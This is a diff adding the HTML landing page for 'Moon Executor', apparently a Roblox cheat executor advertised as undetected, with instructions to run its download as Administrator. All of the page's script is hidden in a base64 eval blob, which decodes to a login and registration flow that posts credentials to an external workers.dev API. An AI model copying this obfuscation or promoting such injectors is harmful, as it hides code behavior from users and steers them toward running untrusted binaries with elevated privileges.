@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Moon Executor</title>
+<style>
+:root{--bg:#07050a;--surface:rgba(20,20,30,0.55);--text:#e0e0e0;--accent:#a855f7}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;position:relative}
+.bg-animation{position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(ellipse at 20% 50%,#1e0a3c 0%,transparent 55%),radial-gradient(ellipse at 80% 20%,#2d1b4e 0%,transparent 50%),var(--bg);z-index:-1;animation:bgShift 12s ease-in-out infinite alternate}
+@keyframes bgShift{0%{opacity:0.95}100%{opacity:1}}
+.container{max-width:1000px;margin:0 auto;padding:0 24px;position:relative}
+nav{display:flex;gap:32px;padding:28px 0;border-bottom:1px solid rgba(168,85,247,0.15);backdrop-filter:blur(10px);position:sticky;top:0;z-index:10}
+nav a{color:#b0b0b0;text-decoration:none;font-weight:500;transition:0.2s}
+nav a:hover{color:#fff;text-shadow:0 0 12px var(--accent)}
+.section{display:none;animation:fadeIn 0.4s ease}
+.section.active{display:block}
+@keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+h1{font-size:3.5rem;font-weight:700;background:linear-gradient(to right,#c084fc,#a855f7,#7c3aed);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:12px}
+h2{font-size:2rem;color:white;margin-bottom:24px}
+p{color:#b0b0b0;line-height:1.7}
+.btn{display:inline-block;background:linear-gradient(135deg,#a855f7,#7c3aed);color:white;padding:14px 32px;border-radius:12px;font-weight:600;text-decoration:none;transition:transform 0.2s,box-shadow 0.2s;box-shadow:0 4px 20px rgba(168,85,247,0.3);border:none;cursor:pointer;margin-top:10px}
+.btn:hover{transform:translateY(-2px);box-shadow:0 8px 30px rgba(168,85,247,0.5)}
+.glass{background:var(--surface);backdrop-filter:blur(14px);border:1px solid rgba(168,85,247,0.15);border-radius:20px;padding:30px;transition:border-color 0.3s,transform 0.3s;margin-bottom:20px}
+.glass:hover{border-color:rgba(168,85,247,0.4);transform:translateY(-4px)}
+.features{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:24px;margin:50px 0}
+.feature-icon{margin-bottom:16px}
+.feature-icon svg{width:36px;height:36px;color:#a855f7}
+.status-indicator{display:flex;align-items:center;gap:16px;margin:20px 0}
+.status-dot{width:18px;height:18px;border-radius:50%;box-shadow:0 0 20px currentColor}
+.status-text{font-size:1.3rem;font-weight:600}
+footer{margin-top:80px;padding:30px 0;text-align:center;border-top:1px solid rgba(168,85,247,0.1);color:#555}
+.form-group{margin-bottom:16px}
+.form-group label{display:block;margin-bottom:4px;color:#ccc}
+.form-group input{width:100%;padding:12px;background:#1a1a2e;border:1px solid #333;border-radius:8px;color:white}
+.form-group input:focus{border-color:var(--accent);outline:none}
+.error{color:#f87171;font-size:0.9rem}
+.profile-header{display:flex;align-items:center;gap:20px;margin-bottom:24px}
+.profile-header img{width:64px;height:64px;border-radius:50%;background:#333}
+@media(max-width:600px){h1{font-size:2.4rem}nav{gap:18px}}
+</style>
+</head>
+<body>
+<div class="bg-animation"></div>
+<div class="container">
+<nav>
+<a href="#" data-page="home">Home</a>
+<a href="#" data-page="download">Download</a>
+<a href="#" data-page="status">Status</a>
+<span id="navAuth" style="margin-left:auto;">
+<a href="#" data-page="login">Login</a>
+<a href="#" data-page="register">Register</a>
+</span>
+</nav>
+<div id="home" class="section active">
+<h1>Moon Executor</h1>
+<p style="font-size:1.2rem;margin-bottom:36px">Precision. Stealth. Free.</p>
+<div class="features">
+<div class="glass"><div class="feature-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon></svg></div><h3 style="color:white;margin-bottom:8px">Lightning Fast</h3><p>Optimised execution with zero overhead.</p></div>
+<div class="glass"><div class="feature-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg></div><h3 style="color:white;margin-bottom:8px">Undetected</h3><p>Advanced stealth technology keeps you safe.</p></div>
+<div class="glass"><div class="feature-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"></polyline><polyline points="8 6 2 12 8 18"></polyline></svg></div><h3 style="color:white;margin-bottom:8px">Extensible</h3><p>Full Lua scripting environment.</p></div>
+</div>
+<a href="#" class="btn" data-page="download"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:middle;margin-right:6px"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>Download Now</a>
+<p style="margin-top:16px;font-size:0.9rem">Requires Windows 10/11 (64‑bit)</p>
+</div>
+<div id="download" class="section">
+<h2>Download</h2>
+<div class="glass">
+<p style="font-size:1.2rem;color:white">Moon Executor <strong>v1.0.0</strong></p>
+<div style="margin-bottom:24px"><span style="background:rgba(255,255,255,0.04);padding:10px 18px;border-radius:8px;margin-right:10px">June 2026</span><span style="background:rgba(255,255,255,0.04);padding:10px 18px;border-radius:8px;margin-right:10px">~12 MB</span><span style="background:rgba(255,255,255,0.04);padding:10px 18px;border-radius:8px">SHA-256: <code>5d4e6f...</code></span></div>
+<a href="https://github.com/tlmoondevs/Moon/releases" class="btn"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:middle;margin-right:6px"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>Download from GitHub Releases</a>
+<p style="font-size:0.9rem;margin-top:18px">Run as Administrator after download.</p>
+</div>
+</div>
+<div id="status" class="section">
+<h2>Live Status</h2>
+<div class="glass">
+<div class="status-indicator"><span id="statusDot" class="status-dot" style="background:gray"></span><span id="statusText" class="status-text">Checking...</span></div>
+<p id="statusDetails" style="color:#888"></p>
+</div>
+</div>
+<div id="login" class="section">
+<h2>Login</h2>
+<div class="glass" style="max-width:400px"><div id="loginError" class="error"></div>
+<div class="form-group"><label>Email</label><input type="email" id="loginEmail" placeholder="you@example.com"></div>
+<div class="form-group"><label>Password</label><input type="password" id="loginPassword"></div>
+<button class="btn" id="loginBtn">Log In</button>
+</div>
+</div>
+<div id="register" class="section">
+<h2>Register</h2>
+<div class="glass" style="max-width:400px"><div id="regError" class="error"></div>
+<div class="form-group"><label>Username</label><input type="text" id="regUsername" placeholder="YourUsername"></div>
+<div class="form-group"><label>Email</label><input type="email" id="regEmail" placeholder="you@example.com"></div>
+<div class="form-group"><label>Password</label><input type="password" id="regPassword"></div>
+<button class="btn" id="registerBtn">Create Account</button>
+</div>
+</div>
+<div id="profile" class="section">
+<h2>Profile</h2>
+<div class="glass">
+<div class="profile-header"><svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#a855f7" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+<div><h3 id="profileUsername" style="color:white">Username</h3><p id="profileKey" style="color:#a855f7;font-family:monospace">Key: loading...</p><p id="profileStatus" style="font-size:0.9rem"></p></div>
+</div>
+<div class="form-group"><label>Display Name</label><input type="text" id="nicknameInput"></div>
+<div class="form-group"><label>Avatar URL (optional)</label><input type="text" id="avatarUrlInput" placeholder="https://i.imgur.com/..."></div>
+<button class="btn" id="saveProfileBtn">Save Changes</button>
+<hr style="border-color:rgba(168,85,247,0.2);margin:20px 0">
+<details><summary style="cursor:pointer;color:white">Change Email / Password</summary>
+<div style="margin-top:16px"><div class="form-group"><label>New Email</label><input type="email" id="newEmail"></div><button class="btn" id="changeEmailBtn">Change Email</button></div>
+<div style="margin-top:16px"><div class="form-group"><label>Current Password</label><input type="password" id="currentPassword"></div><div class="form-group"><label>New Password</label><input type="password" id="newPassword"></div><button class="btn" id="changePasswordBtn">Change Password</button></div>
+</details>
+</div>
+</div>
+<footer>Moon Executor – Educational tool. Not affiliated with Roblox Corporation.</footer>
+</div>
+<script>
+eval(atob('LyogTU9PTiBMSUdIVCBTT1VSQ0UgKi8KKGZ1bmN0aW9uKCl7Y29uc3QgXzB4MT0naHR0cHM6Ly9tb29uLWFwaS5yZWFsbHlmcm9zdHB2cC1iNjEud29ya2Vycy5kZXYnO2NvbnN0IF8weDI9J3Rva2VuJztmdW5jdGlvbiBfMHgzKCl7cmV0dXJuIGxvY2FsU3RvcmFnZS5nZXRJdGVtKF8weDIpfWZ1bmN0aW9uIF8weDQodCl7bG9jYWxTdG9yYWdlLnNldEl0ZW0oXzB4Mix0KX1mdW5jdGlvbiBfMHg1KCl7bG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oXzB4Mil9CmRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ25hdiBhW2RhdGEtcGFnZV0sIC5idG5bZGF0YS1wYWdlXScpLmZvckVhY2goZnVuY3Rpb24oZSl7ZS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsZnVuY3Rpb24oZXYpe2V2LnByZXZlbnREZWZhdWx0KCk7Y29uc3QgcD1ldi50YXJnZXQuZGF0YXNldC5wYWdlO2lmKCFwKXJldHVybjtkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCcuc2VjdGlvbicpLmZvckVhY2goZnVuY3Rpb24ocyl7cy5jbGFzc0xpc3QucmVtb3ZlKCdhY3RpdmUnKX0pO2RvY3VtZW50LmdldEVsZW1lbnRCeUlkKHApLmNsYXNzTGlzdC5hZGQoJ2FjdGl2ZScpfSl9KTsKYXN5bmMgZnVuY3Rpb24gXzB4Nigpe2NvbnN0IHQ9XzB4MygpO2NvbnN0IG49ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ25hdkF1dGgnKTtpZih0KXtuLmlubmVySFRNTD0nPGEgaHJlZj0iIyIgZGF0YS1wYWdlPSJwcm9maWxlIj5Qcm9maWxlPC9hPiA8YSBocmVmPSIjIiBpZD0ibG9nb3V0TGluayI+TG9nb3V0PC9hPic7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ291dExpbmsnKS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsZnVuY3Rpb24oKXtfMHg1KCk7bG9jYXRpb24ucmVsb2FkKCl9KTtpZihkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncHJvZmlsZScpLmNsYXNzTGlzdC5jb250YWlucygnYWN0aXZlJykpe18weDcoKX19ZWxzZXtuLmlubmVySFRNTD0nPGEgaHJlZj0iIyIgZGF0YS1wYWdlPSJsb2dpbiI+TG9naW48L2E+IDxhIGhyZWY9IiMiIGRhdGEtcGFnZT0icmVnaXN0ZXIiPlJlZ2lzdGVyPC9hPid9fQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncmVnaXN0ZXJCdG4nKS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsYXN5bmMgZnVuY3Rpb24oKXtjb25zdCB1PWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdyZWdVc2VybmFtZScpLnZhbHVlLnRyaW0oKTtjb25zdCBlPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdyZWdFbWFpbCcpLnZhbHVlLnRyaW0oKTtjb25zdCBwPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdyZWdQYXNzd29yZCcpLnZhbHVlO2NvbnN0IGVyPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdyZWdFcnJvcicpO2lmKCF1fHwhZXx8IXApe2VyLnRleHRDb250ZW50PSdBbGwgZmllbGRzIHJlcXVpcmVkJztyZXR1cm59CmVyLnRleHRDb250ZW50PSdSZWdpc3RlcmluZy4uLic7dHJ5e2NvbnN0IHI9YXdhaXQgZmV0Y2goXzB4MSsnL2FwaS9yZWdpc3Rlcicse21ldGhvZDonUE9TVCcsaGVhZGVyczp7J0NvbnRlbnQtVHlwZSc6J2FwcGxpY2F0aW9uL2pzb24nfSxib2R5OkpTT04uc3RyaW5naWZ5KHt1c2VybmFtZTp1LGVtYWlsOmUscGFzc3dvcmQ6cH0pfSk7Y29uc3QgdD1hd2FpdCByLnRleHQoKTtpZighci5vayl7ZXIudGV4dENvbnRlbnQ9dHx8J1JlZ2lzdHJhdGlvbiBmYWlsZWQnO3JldHVybn0KYWxlcnQoJ1JlZ2lzdGVyZWQhIFBsZWFzZSBsb2dpbi4nKTtkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCcuc2VjdGlvbicpLmZvckVhY2goZnVuY3Rpb24ocyl7cy5jbGFzc0xpc3QucmVtb3ZlKCdhY3RpdmUnKX0pO2RvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbicpLmNsYXNzTGlzdC5hZGQoJ2FjdGl2ZScpO2VyLnRleHRDb250ZW50PScnfWNhdGNoKGUpe2VyLnRleHRDb250ZW50PSdOZXR3b3JrIGVycm9yIOKAkyBjaGVjayBjb25zb2xlIChGMTIpJztjb25zb2xlLmVycm9yKGUpfX0pOwpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5CdG4nKS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsYXN5bmMgZnVuY3Rpb24oKXtjb25zdCBlPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbkVtYWlsJykudmFsdWUudHJpbSgpO2NvbnN0IHA9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luUGFzc3dvcmQnKS52YWx1ZTtjb25zdCBlcj1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5FcnJvcicpO2lmKCFlfHwhcCl7ZXIudGV4dENvbnRlbnQ9J0FsbCBmaWVsZHMgcmVxdWlyZWQnO3JldHVybn0KZXIudGV4dENvbnRlbnQ9J0xvZ2dpbmcgaW4uLi4nO3RyeXtjb25zdCByPWF3YWl0IGZldGNoKF8weDErJy9hcGkvbG9naW4nLHttZXRob2Q6J1BPU1QnLGhlYWRlcnM6eydDb250ZW50LVR5cGUnOidhcHBsaWNhdGlvbi9qc29uJ30sYm9keTpKU09OLnN0cmluZ2lmeSh7ZW1haWw6ZSxwYXNzd29yZDpwfSl9KTtjb25zdCB0PWF3YWl0IHIudGV4dCgpO2lmKCFyLm9rKXtlci50ZXh0Q29udGVudD10fHwnSW52YWxpZCBjcmVkZW50aWFscyc7cmV0dXJufQpjb25zdCBkPUpTT04ucGFyc2UodCk7XzB4NChkLnRva2VuKTtsb2NhdGlvbi5yZWxvYWQoKX1jYXRjaChlKXtlci50ZXh0Q29udGVudD0nTmV0d29yayBlcnJvciDigJMgY2hlY2sgY29uc29sZSc7Y29uc29sZS5lcnJvcihlKX19KTsKYXN5bmMgZnVuY3Rpb24gXzB4Nygpe2NvbnN0IHQ9XzB4MygpO2lmKCF0KXJldHVybjt0cnl7Y29uc3Qgcj1hd2FpdCBmZXRjaChfMHgxKycvYXBpL21lJyx7aGVhZGVyczp7J0F1dGhvcml6YXRpb24nOmBCZWFyZXIgJHt0fWB9fSk7aWYoIXIub2spdGhyb3cgbmV3IEVycm9yKCdVbmF1dGhvcml6ZWQnKTtjb25zdCB1PWF3YWl0IHIuanNvbigpO2RvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9maWxlVXNlcm5hbWUnKS50ZXh0Q29udGVudD11LnVzZXJuYW1lO2RvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9maWxlS2V5JykudGV4dENvbnRlbnQ9J0tleTogJyt1LmtleTtkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbmlja25hbWVJbnB1dCcpLnZhbHVlPXUubmlja25hbWV8fCcnO2RvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhdmF0YXJVcmxJbnB1dCcpLnZhbHVlPXUuYXZhdGFyX3VybHx8Jyc7Y29uc3Qgc3RhdHVzRWw9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Byb2ZpbGVTdGF0dXMnKTtpZihzdGF0dXNFbCl7c3RhdHVzRWwudGV4dENvbnRlbnQ9dS5hY3RpdmU/J0FjdGl2ZSc6J0Jhbm5lZCc7c3RhdHVzRWwuc3R5bGUuY29sb3I9dS5hY3RpdmU/JyM0YWRlODAnOicjZjg3MTcxJ319Y2F0Y2goZSl7XzB4NSgpO2xvY2F0aW9uLnJlbG9hZCgpfX0KZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3NhdmVQcm9maWxlQnRuJykuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLGFzeW5jIGZ1bmN0aW9uKCl7Y29uc3QgdD1fMHgzKCk7aWYoIXQpcmV0dXJuO2NvbnN0IG5pY2s9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ25pY2tuYW1lSW5wdXQnKS52YWx1ZS50cmltKCk7Y29uc3QgYXZhPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhdmF0YXJVcmxJbnB1dCcpLnZhbHVlLnRyaW0oKTthd2FpdCBmZXRjaChfMHgxKycvYXBpL21lJyx7bWV0aG9kOidQQVRDSCcsaGVhZGVyczp7J0F1dGhvcml6YXRpb24nOmBCZWFyZXIgJHt0fWAsJ0NvbnRlbnQtVHlwZSc6J2FwcGxpY2F0aW9uL2pzb24nfSxib2R5OkpTT04uc3RyaW5naWZ5KHtuaWNrbmFtZTpuaWNrLGF2YXRhcl91cmw6YXZhfSl9KTthbGVydCgnUHJvZmlsZSB1cGRhdGVkIScpO18weDcoKX0pOwpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY2hhbmdlRW1haWxCdG4nKS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsYXN5bmMgZnVuY3Rpb24oKXtjb25zdCB0PV8weDMoKTtjb25zdCBuZT1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbmV3RW1haWwnKS52YWx1ZS50cmltKCk7aWYoIW5lKXJldHVybjtjb25zdCByPWF3YWl0IGZldGNoKF8weDErJy9hcGkvbWUvZW1haWwnLHttZXRob2Q6J1BBVENIJyxoZWFkZXJzOnsnQXV0aG9yaXphdGlvbic6YEJlYXJlciAke3R9YCwnQ29udGVudC1UeXBlJzonYXBwbGljYXRpb24vanNvbid9LGJvZHk6SlNPTi5zdHJpbmdpZnkoe2VtYWlsOm5lfSl9KTtpZihyLm9rKWFsZXJ0KCdFbWFpbCB1cGRhdGVkIScpO2Vsc2UgYWxlcnQoJ0Vycm9yOiAnKyhhd2FpdCByLnRleHQoKSkpfSk7CmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjaGFuZ2VQYXNzd29yZEJ0bicpLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJyxhc3luYyBmdW5jdGlvbigpe2NvbnN0IHQ9XzB4MygpO2NvbnN0IGNwPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjdXJyZW50UGFzc3dvcmQnKS52YWx1ZTtjb25zdCBucD1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbmV3UGFzc3dvcmQnKS52YWx1ZTtpZighY3B8fCFucClyZXR1cm47Y29uc3Qgcj1hd2FpdCBmZXRjaChfMHgxKycvYXBpL21lL3Bhc3N3b3JkJyx7bWV0aG9kOidQQVRDSCcsaGVhZGVyczp7J0F1dGhvcml6YXRpb24nOmBCZWFyZXIgJHt0fWAsJ0NvbnRlbnQtVHlwZSc6J2FwcGxpY2F0aW9uL2pzb24nfSxib2R5OkpTT04uc3RyaW5naWZ5KHtjdXJyZW50UGFzc3dvcmQ6Y3AsbmV3UGFzc3dvcmQ6bnB9KX0pO2lmKHIub2spYWxlcnQoJ1Bhc3N3b3JkIGNoYW5nZWQhJyk7ZWxzZSBhbGVydCgnRXJyb3I6ICcrKGF3YWl0IHIudGV4dCgpKSl9KTsKZmV0Y2goJ3N0YXR1cy5qc29uJykudGhlbihmdW5jdGlvbihyKXtyZXR1cm4gci5qc29uKCl9KS50aGVuKGZ1bmN0aW9uKGQpe2NvbnN0IGRvdD1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc3RhdHVzRG90Jyk7Y29uc3QgdHh0PWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzdGF0dXNUZXh0Jyk7ZG90LnN0eWxlLmJhY2tncm91bmQ9ZC5jb2xvcjtkb3Quc3R5bGUuYm94U2hhZG93PScwIDAgMjBweCAnK2QuY29sb3I7dHh0LnRleHRDb250ZW50PWQudGV4dDtkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc3RhdHVzRGV0YWlscycpLnRleHRDb250ZW50PSdMYXN0IHVwZGF0ZWQ6ICcrbmV3IERhdGUoKS50b0xvY2FsZVN0cmluZygpfSkuY2F0Y2goZnVuY3Rpb24oKXtkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc3RhdHVzRG90Jykuc3R5bGUuYmFja2dyb3VuZD0nZ3JheSc7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3N0YXR1c1RleHQnKS50ZXh0Q29udGVudD0nU3RhdHVzIHVuYXZhaWxhYmxlJ30pOwpfMHg2KCl9KSgpOw=='))
+</script>
+</body>
+</html>
